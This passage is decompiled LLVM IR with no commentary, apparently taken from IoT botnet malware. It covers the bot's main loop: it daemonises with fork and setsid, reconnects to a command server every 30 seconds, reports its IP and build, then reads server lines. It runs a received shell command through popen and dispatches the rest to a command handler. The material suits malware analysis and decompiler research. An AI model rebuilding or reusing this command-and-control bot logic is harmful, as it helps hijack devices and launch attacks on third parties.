  br label %dec_label_pc_e908

dec_label_pc_e908:                                ; preds = %dec_label_pc_e908.outer, %dec_label_pc_e8b8
  %v2_e90c = call i32 @feof(i16* %v1_e90c)
  %v2_e914 = icmp eq i32 %v2_e90c, 0
  br i1 %v2_e914, label %dec_label_pc_e8b8, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %dec_label_pc_e908
  %v2_e920 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e92c = call i32 @__GI_fclose(i16* %v1_e90c)
  br i1 %v2_e920, label %dec_label_pc_e928, label %dec_label_pc_e980

dec_label_pc_e928:                                ; preds = %dec_label_pc_e91c
  %v4_e930 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e930, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c3e0.273 to i32), i32* @r1, align 4
  %v3_e938 = call i32 @__GI_fopen(i32 %v4_e930, i32 ptrtoint (i32* @global_var_1c3e0.273 to i32))
  %v2_e948 = icmp eq i32 %v3_e938, 0
  br i1 %v2_e948, label %dec_label_pc_e980, label %dec_label_pc_e950

dec_label_pc_e950:                                ; preds = %dec_label_pc_e928
  %v2_e95c = call i32 @__GI_fputs(i32 %v2_e89c, i32 %v3_e938)
  %v1_e964 = inttoptr i32 %v3_e938 to i16*
  %v2_e964 = call i32 @__GI_fclose(i16* %v1_e964)
  br label %dec_label_pc_e980

dec_label_pc_e978:                                ; preds = %dec_label_pc_e7f0
  %v1_e97c = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_e97c = call i32 @__GI_fclose(i16* %v1_e97c)
  br label %dec_label_pc_e980

dec_label_pc_e980:                                ; preds = %dec_label_pc_e91c, %dec_label_pc_e928, %dec_label_pc_e7e4, %dec_label_pc_e950, %dec_label_pc_e978
  %v0_e980 = call i32 @getOurIP()
  store i32 %v0_e980, i32* @r0, align 4
  %v0_e984 = call i32 @__libc_fork()
  store i32 %v0_e984, i32* @r0, align 4
  %v2_e994 = icmp eq i32 %v0_e984, 0
  br i1 %v2_e994, label %dec_label_pc_e9c4, label %dec_label_pc_ea00

dec_label_pc_e9c4:                                ; preds = %dec_label_pc_e980
  %v0_e9c4 = call i32 @__libc_fork()
  store i32 %v0_e9c4, i32* @r0, align 4
  %v2_e9d4 = icmp eq i32 %v0_e9c4, 0
  br i1 %v2_e9d4, label %dec_label_pc_e9e4.thread, label %dec_label_pc_e9f0

dec_label_pc_e9e4.thread:                         ; preds = %dec_label_pc_e9c4
  br label %dec_label_pc_ea0c

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9c4
  %v1_e9e0 = call i32 @__GI_exit(i32 0)
  %v2_e9f8 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1c3e4.275 to i32))
  store i32 %v2_e9f8, i32* @r0, align 4
  br label %dec_label_pc_ea0c

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e980
  %v2_e99c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_e984, i32* @r0, align 4
  %v3_e9ac = call i32 @__libc_waitpid(i32 %v0_e984, i32 %v2_e99c, i32 0)
  %v1_e9b4 = call i32 @__GI_exit(i32 0)
  %v2_ea08 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1c3e4.275 to i32))
  store i32 %v2_ea08, i32* @r0, align 4
  br label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e9e4.thread, %dec_label_pc_e9f0, %dec_label_pc_ea00
  %v0_ea0c = call i32 @__GI_setsid()
  %v1_ea14 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1c3d4.269 to i32))
  %v2_ea20 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_f278 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f288 = bitcast i32* %stack_var_-5744 to i8*
  %v2_f008 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_f018 = bitcast i32* %stack_var_-1648 to i8*
  %v1_ee98 = or i32 %v2_f278, 1
  %v5_ee9c = inttoptr i32 %v1_ee98 to i8*
  %v2_f148 = add i32 %v19_e69c, -600
  br label %dec_label_pc_ea24.outer

dec_label_pc_ea24.outer:                          ; preds = %dec_label_pc_edf0, %dec_label_pc_f268, %dec_label_pc_ea0c
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_ea0c ], [ %stack_var_-96.2.ph, %dec_label_pc_f268 ], [ %v1_edf4, %dec_label_pc_edf0 ]
  %v0_ea2424 = call i32 @initConnection()
  %v2_ea2c26 = icmp eq i32 %v0_ea2424, 0
  br i1 %v2_ea2c26, label %dec_label_pc_ea40, label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %dec_label_pc_ea24.outer, %dec_label_pc_ea34
  %v1_ea38 = call i32 @sleep(i32 30)
  %v0_ea24 = call i32 @initConnection()
  %v2_ea2c = icmp eq i32 %v0_ea24, 0
  br i1 %v2_ea2c, label %dec_label_pc_ea40, label %dec_label_pc_ea34

dec_label_pc_ea40:                                ; preds = %dec_label_pc_ea34, %dec_label_pc_ea24.outer
  %v2_ea44 = load i32, i32* @global_var_26498.45, align 4
  store i32 %v2_ea44, i32* @r5, align 4
  %v2_ea4c = load i32, i32* @global_var_2c6fc.77, align 4
  store i32 %v2_ea4c, i32* @r0, align 4
  %v1_ea50 = call i32 @__GI_inet_ntoa(i32 %v2_ea4c)
  store i32 %v1_ea50, i32* @r4, align 4
  %v0_ea58 = call i32 @getBuild()
  %v0_ea60 = load i32, i32* @r5, align 4
  %v0_ea68 = load i32, i32* @r4, align 4
  %v4_ea6c = call i32 @Rootsprintf(i32 %v0_ea60, i32 ptrtoint (i32* @global_var_1c3f4.279 to i32), i32 %v0_ea68, i32 %v0_ea58)
  br label %dec_label_pc_f268.outer

dec_label_pc_ea90:                                ; preds = %dec_label_pc_ed44, %dec_label_pc_ecf0
  %v3_ea94 = mul i32 %v3_ed38, 4
  %v2_eaa0 = load i32, i32* @global_var_2c708.64, align 4
  %v2_eaa4 = add i32 %v2_eaa0, %v3_ea94
  %v1_eaa8 = inttoptr i32 %v2_eaa4 to i32*
  %v2_eaa8 = load i32, i32* %v1_eaa8, align 4
  store i32 %v2_eaa8, i32* @r0, align 4
  %v3_eab8 = call i32 @__libc_waitpid(i32 %v2_eaa8, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_eab8, 1
  br i1 %tmp111, label %dec_label_pc_ece4, label %dec_label_pc_eb1c

dec_label_pc_ead8:                                ; preds = %dec_label_pc_eb78, %dec_label_pc_eb1c
  %v2_eadc = load i32, i32* @global_var_2c708.64, align 4
  %v3_eae8 = mul i32 %v1_eacc, 4
  %v1_eae0 = add i32 %v3_eae8, -4
  %v2_eaec = add i32 %v1_eae0, %v2_eadc
  %v2_eb04 = add i32 %v2_eadc, %v3_eae8
  %v1_eb08 = inttoptr i32 %v2_eb04 to i32*
  %v2_eb08 = load i32, i32* %v1_eb08, align 4
  %v2_eb0c = inttoptr i32 %v2_eaec to i32*
  store i32 %v2_eb08, i32* %v2_eb0c, align 4
  br label %dec_label_pc_eb1c

dec_label_pc_eb1c:                                ; preds = %dec_label_pc_ea90, %dec_label_pc_ead8
  %v3_eac8.sink = phi i32 [ %v1_eacc, %dec_label_pc_ead8 ], [ %v3_ed38, %dec_label_pc_ea90 ]
  %v1_eacc = add i32 %v3_eac8.sink, 1
  %v2_eb38 = load i32, i32* @global_var_264a0.61, align 4
  %v5_eb38 = load i32, i32* @global_var_264a4.62, align 4
  %tmp112 = icmp ugt i32 %v5_eb38, %v1_eacc
  br i1 %tmp112, label %dec_label_pc_ead8, label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb1c
  %v9_eb70 = icmp eq i32 %v5_eb38, %v1_eacc
  br i1 %v9_eb70, label %dec_label_pc_eb78, label %dec_label_pc_eb90

dec_label_pc_eb78:                                ; preds = %dec_label_pc_eb60
  %v9_eb88 = icmp eq i32 %v2_eb38, 0
  br i1 %v9_eb88, label %dec_label_pc_eb90, label %dec_label_pc_ead8

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb78, %dec_label_pc_eb60
  %v2_eb94 = load i32, i32* @global_var_2c708.64, align 4
  %v3_eba0 = mul i32 %v1_eacc, 4
  %v1_eb98 = add i32 %v3_eba0, -4
  %v2_eba4 = add i32 %v1_eb98, %v2_eb94
  %v2_ebac = inttoptr i32 %v2_eba4 to i32*
  store i32 0, i32* %v2_ebac, align 4
  %v2_ebb4 = load i32, i32* @global_var_264a0.61, align 4
  %v5_ebb4 = load i32, i32* @global_var_264a4.62, align 4
  %v2_ebc0 = add i32 %v2_ebb4, -1
  %v3_ebc0 = icmp ne i32 %v2_ebb4, 0
  %v3_ebc4 = add i32 %v5_ebb4, -1
  %v4_ebc4 = zext i1 %v3_ebc0 to i32
  %v5_ebc4 = add i32 %v3_ebc4, %v4_ebc4
  store i32 %v2_ebc0, i32* @global_var_264a0.61, align 4
  store i32 %v5_ebc4, i32* @global_var_264a4.62, align 4
  %v3_ebe0 = icmp eq i32 %v2_ebb4, 0
  %v4_ebe4 = zext i1 %v3_ebe0 to i32
  %v5_ebe4 = add i32 %v5_ebc4, %v4_ebe4
  %v3_ebe8 = udiv i32 %v2_ebb4, 1073741824
  %v3_ebec = mul i32 %v5_ebe4, 4
  %v2_ebf0 = or i32 %v3_ebec, %v3_ebe8
  store i32 %v2_ebf0, i32* @r4, align 4
  %v3_ebf4 = mul i32 %v2_ebb4, 4
  %v1_ebfc = call i32 @malloc(i32 %v3_ebf4)
  br label %dec_label_pc_ec54

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ecb0, %dec_label_pc_ec54
  %v3_ec18 = mul i32 %v3_eca4, 4
  %v2_ec24 = add i32 %v3_ec18, %v1_ebfc
  %v2_ec38 = load i32, i32* @global_var_2c708.64, align 4
  %v2_ec3c = add i32 %v2_ec38, %v3_ec18
  %v1_ec40 = inttoptr i32 %v2_ec3c to i32*
  %v2_ec40 = load i32, i32* %v1_ec40, align 4
  %v2_ec44 = inttoptr i32 %v2_ec24 to i32*
  store i32 %v2_ec40, i32* %v2_ec44, align 4
  %v1_ec4c = add i32 %v3_eca4, 1
  br label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_eb90, %dec_label_pc_ec14
  %v3_eca4 = phi i32 [ 0, %dec_label_pc_eb90 ], [ %v1_ec4c, %dec_label_pc_ec14 ]
  %v2_ec70 = load i32, i32* @global_var_264a0.61, align 4
  %v5_ec70 = load i32, i32* @global_var_264a4.62, align 4
  %tmp114 = icmp ugt i32 %v5_ec70, %v3_eca4
  br i1 %tmp114, label %dec_label_pc_ec14, label %dec_label_pc_ec98

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec54
  %v9_eca8 = icmp eq i32 %v5_ec70, %v3_eca4
  br i1 %v9_eca8, label %dec_label_pc_ecb0, label %dec_label_pc_ecc8

dec_label_pc_ecb0:                                ; preds = %dec_label_pc_ec98
  %v9_ecc0 = icmp eq i32 %v2_ec70, 0
  br i1 %v9_ecc0, label %dec_label_pc_ecc8, label %dec_label_pc_ec14

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ecb0, %dec_label_pc_ec98
  %v2_eccc = load i32, i32* @global_var_2c708.64, align 4
  store i32 %v2_eccc, i32* @r0, align 4
  %v0_ecd4 = call i32 @free()
  store i32 %v1_ebfc, i32* @global_var_2c708.64, align 4
  br label %dec_label_pc_ece4

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ea90, %dec_label_pc_ecc8
  %v1_ece8 = add i32 %v3_ed38, 1
  br label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_f268, %dec_label_pc_ece4
  %v3_ed38 = phi i32 [ %v1_ece8, %dec_label_pc_ece4 ], [ 0, %dec_label_pc_f268 ]
  %v3_ecf8 = ashr i32 %v3_ed38, 31
  %v2_ed08 = load i32, i32* @global_var_264a0.61, align 4
  %v5_ed08 = load i32, i32* @global_var_264a4.62, align 4
  %v3_ed24 = icmp uge i32 %v5_ed08, %v3_ed38
  %v9_ed24 = icmp eq i32 %v5_ed08, %v3_ed38
  %v2_ed28 = xor i1 %v9_ed24, true
  %v3_ed28 = and i1 %v3_ed24, %v2_ed28
  br i1 %v3_ed28, label %dec_label_pc_ea90, label %dec_label_pc_ed2c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ecf0
  br i1 %v9_ed24, label %dec_label_pc_ed44, label %dec_label_pc_ed5c

dec_label_pc_ed44:                                ; preds = %dec_label_pc_ed2c
  %tmp = icmp ugt i32 %v2_ed08, %v3_ecf8
  br i1 %tmp, label %dec_label_pc_ea90, label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed2c, %dec_label_pc_ed44
  %v2_ed70 = add i32 %v5_f288, %v2_f278
  %v3_ed70 = inttoptr i32 %v2_ed70 to i8*
  store i8 0, i8* %v3_ed70, align 1
  %v2_ed8c = call i32 @trim(i8* %v4_f288)
  %v9_eda4 = call i32 @strstr(i32 %v2_f278, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c31c.218, i32 0, i32 0), i32 %v2_ed70, i32 %v2_f278, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_edb8 = icmp eq i32 %v9_eda4, %v2_f278
  br i1 %v9_edb8, label %dec_label_pc_f268, label %dec_label_pc_edc0

dec_label_pc_edc0:                                ; preds = %dec_label_pc_ed5c
  %v8_edd4 = call i32 @strstr(i32 %v2_f278, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c458.284, i32 0, i32 0), i32 %v9_eda4, i32 %v2_f278, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ede8 = icmp eq i32 %v8_edd4, %v2_f278
  br i1 %v9_ede8, label %dec_label_pc_edf0, label %dec_label_pc_ee1c

dec_label_pc_edf0:                                ; preds = %dec_label_pc_edc0
  %v1_edf4 = add i32 %stack_var_-96.2.ph, 1
  %v2_ee04 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1c464.286 to i32))
  %v7_ee10 = icmp slt i32 %v1_edf4, 21
  br i1 %v7_ee10, label %dec_label_pc_ea24.outer, label %dec_label_pc_ee14

dec_label_pc_ee14:                                ; preds = %dec_label_pc_edf0
  %v1_ee18 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_edc0, %dec_label_pc_ee14
  %stack_var_-96.1 = phi i32 [ %v1_edf4, %dec_label_pc_ee14 ], [ %stack_var_-96.2.ph, %dec_label_pc_edc0 ]
  %v2_ee30 = load i8, i8* %v4_f288, align 4
  %v7_ee34 = icmp eq i8 %v2_ee30, 33
  br i1 %v7_ee34, label %dec_label_pc_ee58, label %dec_label_pc_f268.outer

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee1c, %dec_label_pc_ee68
  %v3_ee3c.sink = phi i8* [ %storemerge8, %dec_label_pc_ee68 ], [ %v4_f288, %dec_label_pc_ee1c ]
  %v4_ee3c = ptrtoint i8* %v3_ee3c.sink to i32
  %v1_ee40 = add i32 %v4_ee3c, 1
  %storemerge8 = inttoptr i32 %v1_ee40 to i8*
  %v2_ee5c = load i8, i8* %storemerge8, align 1
  %v7_ee60 = icmp eq i8 %v2_ee5c, 32
  br i1 %v7_ee60, label %dec_label_pc_ee78, label %dec_label_pc_ee68

dec_label_pc_ee68:                                ; preds = %dec_label_pc_ee58
  %v2_ee6c = load i8, i8* %storemerge8, align 1
  %v2_ee70 = icmp eq i8 %v2_ee6c, 0
  br i1 %v2_ee70, label %dec_label_pc_ee78, label %dec_label_pc_ee58

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee68, %dec_label_pc_ee58
  %v2_ee7c = load i8, i8* %storemerge8, align 1
  %v2_ee80 = icmp eq i8 %v2_ee7c, 0
  br i1 %v2_ee80, label %dec_label_pc_f268.outer, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee78
  store i8 0, i8* %storemerge8, align 1
  %v3_eea8 = call i32 @strlen(i8* %v5_ee9c)
  %v2_eeb8 = add i32 %v3_eea8, %v2_f278
  %v1_eebc = add i32 %v2_eeb8, 2
  %v5_eec0 = inttoptr i32 %v1_eebc to i8*
  %v1_eef0 = add i32 %v2_eeb8, 1
  br label %dec_label_pc_eeec

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ef14, %dec_label_pc_eeec
  %v3_eed8 = call i32 @strlen(i8* %v5_eec0)
  %v2_eee0 = add i32 %v1_eef0, %v3_eed8
  %v3_eee8 = inttoptr i32 %v2_eee0 to i8*
  store i8 0, i8* %v3_eee8, align 1
  br label %dec_label_pc_eeec

dec_label_pc_eeec:                                ; preds = %dec_label_pc_ee88, %dec_label_pc_eec8
  %v3_eefc = call i32 @strlen(i8* %v5_eec0)
  %v2_ef04 = add i32 %v1_eef0, %v3_eefc
  %v1_ef08 = inttoptr i32 %v2_ef04 to i8*
  %v2_ef08 = load i8, i8* %v1_ef08, align 1
  %v7_ef0c = icmp eq i8 %v2_ef08, 10
  br i1 %v7_ef0c, label %dec_label_pc_eec8, label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eeec
  store i32 %v1_eef0, i32* @r4, align 4
  %v3_ef24 = call i32 @strlen(i8* %v5_eec0)
  %v0_ef2c = load i32, i32* @r4, align 4
  %v2_ef2c = add i32 %v0_ef2c, %v3_ef24
  %v1_ef30 = inttoptr i32 %v2_ef2c to i8*
  %v2_ef30 = load i8, i8* %v1_ef30, align 1
  %v7_ef34 = icmp eq i8 %v2_ef30, 13
  br i1 %v7_ef34, label %dec_label_pc_eec8, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef14
  %v2_ef5828 = load i8, i8* %v5_eec0, align 1
  %v7_ef5c32 = icmp eq i8 %v2_ef5828, 32
  br i1 %v7_ef5c32, label %dec_label_pc_ef74, label %dec_label_pc_ef64

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef64
  %v1_ef4c = add i32 %v4_ef5434, 1
  %v5_ef50 = inttoptr i32 %v1_ef4c to i8*
  %v2_ef58 = load i8, i8* %v5_ef50, align 1
  %v7_ef5c = icmp eq i8 %v2_ef58, 32
  br i1 %v7_ef5c, label %dec_label_pc_ef74, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef3c, %dec_label_pc_ef48
  %v4_ef5434 = phi i32 [ %v1_ef4c, %dec_label_pc_ef48 ], [ %v1_eebc, %dec_label_pc_ef3c ]
  %stack_var_-64.033 = phi i8* [ %v5_ef50, %dec_label_pc_ef48 ], [ %v5_eec0, %dec_label_pc_ef3c ]
  %v2_ef68 = load i8, i8* %stack_var_-64.033, align 1
  %v2_ef6c = icmp eq i8 %v2_ef68, 0
  br i1 %v2_ef6c, label %dec_label_pc_ef74, label %dec_label_pc_ef48

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef48, %dec_label_pc_ef64, %dec_label_pc_ef3c
  %stack_var_-64.0.lcssa = phi i8* [ %v5_eec0, %dec_label_pc_ef3c ], [ %v5_ef50, %dec_label_pc_ef48 ], [ %stack_var_-64.033, %dec_label_pc_ef64 ]
  %v4_ef54.lcssa = phi i32 [ %v1_eebc, %dec_label_pc_ef3c ], [ %v1_ef4c, %dec_label_pc_ef48 ], [ %v4_ef5434, %dec_label_pc_ef64 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_ef84 = add i32 %v4_ef54.lcssa, 1
  %v2_efc839 = load i8, i8* %v5_eec0, align 1
  %v2_efcc41 = icmp eq i8 %v2_efc839, 0
  br i1 %v2_efcc41, label %dec_label_pc_efd4, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_ef74, %dec_label_pc_ef98
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_ef98 ], [ %v5_eec0, %dec_label_pc_ef74 ]
  %storemerge1442 = phi i32 [ %v1_efbc, %dec_label_pc_ef98 ], [ %v1_eebc, %dec_label_pc_ef74 ]
  %v2_ef9c = load i8, i8* %storemerge743, align 1
  %v3_ef9c = zext i8 %v2_ef9c to i32
  %v1_efa4 = call i32 @__GI_toupper(i32 %v3_ef9c)
  %v1_efb4 = trunc i32 %v1_efa4 to i8
  store i8 %v1_efb4, i8* %storemerge743, align 1
  %v1_efbc = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_efbc to i8*
  %v2_efc8 = load i8, i8* %storemerge7, align 1
  %v2_efcc = icmp eq i8 %v2_efc8, 0
  br i1 %v2_efcc, label %dec_label_pc_efd4, label %dec_label_pc_ef98

dec_label_pc_efd4:                                ; preds = %dec_label_pc_ef98, %dec_label_pc_ef74
  store i32 ptrtoint ([11 x i8]* @global_var_1c478.288 to i32), i32* @r1, align 4
  %v4_efe0 = call i32 @__GI_strcoll(i8* %v5_eec0, i32 ptrtoint ([11 x i8]* @global_var_1c478.288 to i32))
  store i32 %v4_efe0, i32* @r0, align 4
  %v2_efe8 = icmp eq i32 %v4_efe0, 0
  br i1 %v2_efe8, label %dec_label_pc_eff0, label %dec_label_pc_f0d4

dec_label_pc_eff0:                                ; preds = %dec_label_pc_efd4
  %v0_eff0 = call i32 @listFork()
  %v2_eff8 = icmp eq i32 %v0_eff0, 0
  br i1 %v2_eff8, label %dec_label_pc_f000, label %dec_label_pc_f268.outer

dec_label_pc_f000:                                ; preds = %dec_label_pc_eff0
  store i32 1024, i32* @r2, align 4
  %v3_f018 = call i32 @__GI_memset(i8* %v2_f018, i32 0)
  %v7_f038 = call i32 @szprintf(i32 %v2_f008, i32 ptrtoint ([8 x i8]* @global_var_1c484.290 to i32), i32 %v1_ef84, i32 %v2_f008, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_f054 = call i32 @fdpopen(i32 %v2_f008, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1c3c0.265, i32 0, i32 0))
  br label %dec_label_pc_f09c

dec_label_pc_f064:                                ; preds = %dec_label_pc_f09c
  %v2_f074 = call i32 @trim(i8* %v2_f018)
  store i32 1024, i32* @r2, align 4
  %v3_f090 = call i32 @__GI_memset(i8* %v2_f018, i32 0)
  %v1_f098 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f000, %dec_label_pc_f064
  %v4_f0b4 = call i32 @fdgets(i32 %v2_f008, i32 1024, i32 %v3_f054, i32 %v2_f008)
  %v2_f0bc = icmp eq i32 %v4_f0b4, 0
  br i1 %v2_f0bc, label %dec_label_pc_f0c4, label %dec_label_pc_f064

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f09c
  %v1_f0c8 = call i32 @fdpclose(i32 %v3_f054)
  %v1_f0d0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f0d4

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_efd4, %dec_label_pc_f0c4
  %v2_f0e8 = call i32 @__GI_strtok(i32 %v1_ef84, i32 ptrtoint (i32* @global_var_1c48c.292 to i32))
  store i32 %v1_eebc, i32* %stack_var_-624, align 4
  %v2_f1ec46 = icmp eq i32 %v2_f0e8, 0
  br i1 %v2_f1ec46, label %dec_label_pc_f1f4, label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0d4, %dec_label_pc_f1d4
  %stack_var_-36.049.in = phi i32 [ %v2_f1dc, %dec_label_pc_f1d4 ], [ %v2_f0e8, %dec_label_pc_f0d4 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f1d4 ], [ 1, %dec_label_pc_f0d4 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_f104 = load i8, i8* %stack_var_-36.049, align 1
  %v7_f108 = icmp eq i8 %v2_f104, 10
  br i1 %v7_f108, label %dec_label_pc_f1d4, label %dec_label_pc_f110

dec_label_pc_f110:                                ; preds = %dec_label_pc_f100
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_f11c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f124 = add i32 %v3_f11c, 1
  %v1_f12c = call i32 @malloc(i32 %v1_f124)
  %v0_f140 = load i32, i32* @r4, align 4
  %v3_f140 = mul i32 %v0_f140, 4
  %v2_f14c = add i32 %v2_f148, %v3_f140
  %v2_f150 = inttoptr i32 %v2_f14c to i32*
  store i32 %v1_f12c, i32* %v2_f150, align 4
  %v3_f160 = mul i32 %stack_var_-40.147, 4
  %v2_f168 = add i32 %v3_f160, %v19_e69c
  %v2_f16c = add i32 %v2_f168, -600
  %v1_f170 = inttoptr i32 %v2_f16c to i32*
  %v2_f170 = load i32, i32* %v1_f170, align 4
  store i32 %v2_f170, i32* @r4, align 4
  %v3_f17c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f184 = add i32 %v3_f17c, 1
  %v0_f188 = load i32, i32* @r4, align 4
  store i32 %v1_f184, i32* @r2, align 4
  %v2_f194 = inttoptr i32 %v0_f188 to i8*
  %v3_f194 = call i32 @__GI_memset(i8* %v2_f194, i32 0)
  %v2_f1b4 = load i32, i32* %v1_f170, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_f1c4 = inttoptr i32 %v2_f1b4 to i8*
  %v4_f1c4 = call i32 @strcpy(i8* %v3_f1c4, i32 %stack_var_-36.049.in)
  %v1_f1cc = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f100, %dec_label_pc_f110
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_f100 ], [ %v1_f1cc, %dec_label_pc_f110 ]
  %v2_f1dc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c48c.292 to i32))
  %v2_f1ec = icmp eq i32 %v2_f1dc, 0
  br i1 %v2_f1ec, label %dec_label_pc_f1f4, label %dec_label_pc_f100

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1d4, %dec_label_pc_f0d4
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_f0d4 ], [ %stack_var_-40.0, %dec_label_pc_f1d4 ]
  %v3_f200 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f20c = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f20c, label %dec_label_pc_f268.outer, label %dec_label_pc_f224.lr.ph

dec_label_pc_f224.lr.ph:                          ; preds = %dec_label_pc_f1f4
  br label %dec_label_pc_f224

dec_label_pc_f224:                                ; preds = %dec_label_pc_f224.lr.ph, %dec_label_pc_f224
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_f224.lr.ph ], [ %v1_f250, %dec_label_pc_f224 ]
  %v3_f230 = mul i32 %storemerge15128, 4
  %v2_f238 = add i32 %v3_f230, %v19_e69c
  %v2_f23c = add i32 %v2_f238, -600
  %v1_f240 = inttoptr i32 %v2_f23c to i32*
  %v2_f240 = load i32, i32* %v1_f240, align 4
  store i32 %v2_f240, i32* @r0, align 4
  %v0_f248 = call i32 @free()
  %v1_f250 = add nuw nsw i32 %storemerge15128, 1
  %v5_f264 = icmp slt i32 %v1_f250, %stack_var_-40.1.lcssa
  br i1 %v5_f264, label %dec_label_pc_f224, label %dec_label_pc_f268.outer

dec_label_pc_f268.outer:                          ; preds = %dec_label_pc_f224, %dec_label_pc_ee1c, %dec_label_pc_eff0, %dec_label_pc_f1f4, %dec_label_pc_ee78, %dec_label_pc_ea40
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_ea40 ], [ %stack_var_-96.1, %dec_label_pc_ee78 ], [ %stack_var_-96.1, %dec_label_pc_f1f4 ], [ %stack_var_-96.1, %dec_label_pc_eff0 ], [ %stack_var_-96.1, %dec_label_pc_ee1c ], [ %stack_var_-96.1, %dec_label_pc_f224 ]
  br label %dec_label_pc_f268

dec_label_pc_f268:                                ; preds = %dec_label_pc_f268.outer, %dec_label_pc_ed5c
  %v2_f26c = load i32, i32* @global_var_26498.45, align 4
  %v5_f288 = call i32 @recvLine(i32 %v2_f26c, i8* %v4_f288, i32 4096, i32 %v2_f278)
  %v3_f298 = icmp eq i32 %v5_f288, -1
  br i1 %v3_f298, label %dec_label_pc_ea24.outer, label %dec_label_pc_ecf0

; uselistorder directives
  uselistorder i32 %v5_f288, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f1dc, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_efbc, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_ef84, { 1, 0 }
  uselistorder i32 %v1_eef0, { 2, 1, 0 }
  uselistorder i8* %v5_eec0, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_eebc, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_edf4, { 1, 2, 0 }
  uselistorder i1 %v9_ed24, { 1, 0 }
  uselistorder i32 %v3_ed38, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_ec70, { 1, 0 }
